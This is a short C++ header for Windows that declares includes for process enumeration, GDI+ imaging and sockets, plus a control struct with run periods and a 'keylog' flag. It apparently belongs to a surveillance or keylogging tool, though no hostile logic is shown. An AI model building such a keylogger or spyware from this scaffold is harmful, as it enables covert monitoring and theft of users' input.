#pragma once
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>
#include <pthread.h>
#include <ctime>
#include <map>
#include <gdiplus.h>
#pragma warning(disable : 4996)
#pragma comment(lib,"wsock32.lib")
#pragma comment(lib, "pthreadVSE2.lib")
#pragma comment (lib, "mswsock.lib")
#pragma comment(lib, "GdiPlus.lib")
using namespace std;
using namespace Gdiplus;

struct control
{
	unsigned int period[6];
	bool stop;
	bool run[6];
	bool keylog;
	bool run_s;
	unsigned int period_s;
};
